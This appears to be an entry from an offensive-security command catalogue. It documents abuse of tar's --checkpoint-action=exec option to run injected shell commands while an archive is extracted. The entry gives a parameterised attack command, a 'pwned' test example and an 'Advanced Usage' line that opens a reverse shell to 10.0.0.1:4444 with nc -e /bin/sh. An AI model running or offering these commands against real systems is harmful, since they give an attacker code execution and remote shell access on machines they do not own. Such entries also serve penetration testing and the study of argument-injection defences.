---
type: command
executor: bash
data: tar --checkpoint=1 --checkpoint-action=exec=$_SHELL_COMMAND -xf $_ARCHIVE_FILE
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - Unix
tags:
  - injection
  - execution
  - tar
verified: true
validated: true
---

# tar-checkpoint-exec-injection

## Command

```bash
tar --checkpoint=1 --checkpoint-action=exec=$_SHELL_COMMAND -xf $_ARCHIVE_FILE
```

## Description

During extraction, pauses after 1 file and executes a custom shell command, enabling injection for code execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --checkpoint=1 | Display progress after 1 file | Yes |
| --checkpoint-action=exec=$_SHELL_COMMAND | Execute shell command on checkpoint | Yes |
| -x | Extract mode | Yes |
| -f | Archive file | Yes |
| $_ARCHIVE_FILE | Path to TAR file | Yes |
| $_SHELL_COMMAND | Command to inject (e.g., sh -c 'id') | Yes |

## Examples

### Basic Usage

```bash
tar --checkpoint=1 --checkpoint-action=exec=sh\ -c\ 'echo\ pwned' -xf test.tar
```

### Advanced Usage

```bash
tar --checkpoint=1 --checkpoint-action=exec=sh\ -c\ 'nc\ -e\ /bin/sh\ 10.0.0.1\ 4444' -xf test.tar
```

## Expected Output

Extraction progress: "1/10 files". Injected command runs silently unless it produces stdout.

## Related

- [[procedures/TAR-Argument-Injection]]
